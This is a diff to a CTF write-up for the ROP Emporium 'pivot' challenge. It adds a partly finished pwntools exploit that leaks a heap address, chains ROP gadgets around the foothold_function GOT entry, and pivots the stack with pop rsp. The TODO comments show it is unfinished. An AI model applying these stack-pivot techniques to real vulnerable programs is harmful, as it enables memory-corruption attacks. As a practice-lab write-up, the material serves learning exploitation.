@@ -364,10 +364,91 @@ Result:
 > Another solution could be to modify a .got.plt entry in-place using a write
 > gadget, then calling the function whose entry you modified.
 
-- ?????
-- Modify a `.got.plt` entry in-place using a write gadget, then call the
-  function whose entry we modified.
-- ?????
+I'm not quite sure what the intentions are here, but here goes my
+interpretation of it:
+
+- Call `foothold_function@plt` to resolve its address
+- Add the offset `ret2win - foothold_function` to the resolved address
+- Call `foothold_function@plt` again, which will now jump to `ret2win`
+
+```python3
+#!/usr/bin/env python3
+from pwn import *
+context.bits = 64
+context.arch = 'amd64'
+
+process_name = './pivot'
+library_name = './libpivot.so'
+elf = ELF(process_name)
+libelf = ELF(library_name)
+rop = ROP(elf)
+
+DEBUG = False
+DEBUG_ARGS = '''
+# at ret of pwnme
+b *pwnme+182
+# usefulGadgets
+b *0x4009bb
+'''
+
+if DEBUG:
+    p = gdb.debug(process_name, DEBUG_ARGS)
+else:
+    p = process(process_name)
+
+foothold_plt = elf.plt['foothold_function']
+foothold_got = elf.got['foothold_function']
+# distance between foothold and ret2win =  0xA81 - 0x96A
+win_offset_from_foothold = libelf.sym['ret2win'] - libelf.sym['foothold_function']
+
+pop_rsp = rop.find_gadget(['pop rsp'])[0] # followed by pop r13, r14, and r15!!
+pop_rax = rop.rax.address # 0x4009bb, equivalent to: rop.find_gadget(['pop rax', 'ret'])[0]
+mov_rax = 0x004009c0      # apparently, ROP() doesn't know any gadgets starting with `mov`, so we have to hard code it.
+pop_rbp = rop.rbp.address # 0x4007c8
+add_rbp_rax = 0x004009c4
+
+# ** Parse heap address
+p.recvuntil(b'place to pivot: ')
+heap_address = p.recvuntil(b'Send a ROP')
+heap_address = heap_address.replace(b'\nSend a ROP', b'')
+heap_address = int(heap_address, 16)
+info('READ HEAP ADDRESS: %s' % hex(heap_address))
+
+# ** Input heap payload
+heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
+# 1. Resolve foothold by calling it
+heap_payload += p64(foothold_plt)
+# 2. Load foothold@got into $rax register
+heap_payload += p64(pop_rax)
+heap_payload += p64(foothold_got)
+# TODO: figure it out
+# some add (byte/dword/qword) pointer, reg
+# 0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
+# 0x0000000000400a3c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+# ^ can't work out, its adding values from the same register
+# foothold/(%rax): 0x7faeaf1f c96a
+#                  0x7faeaf1f ca81
+# we probably would have to take at least the first two bytes into account
+# this one maybe? ---v
+# 0x000000000040078d : add byte ptr [rax], r8b ; ret
+
+assert len(heap_payload) <= 256, "Heap payload must NOT be larger than 256 bytes!"
+p.recvuntil(b'> ')
+p.sendline(heap_payload)
+
+# ** Input stack payload
+stack_payload  = b'A'*40
+# Move stack to the heap
+stack_payload += p64(pop_rsp)
+stack_payload += p64(heap_address)
+# Values are now pop'ed from the heap memory
+
+assert len(stack_payload) <= 64, "Stack payload must NOT be larger than 64 bytes!"
+p.recvuntil(b'> ')
+p.sendline(stack_payload)
+
+p.interactive()
+```
 
 ## Solution 3
 
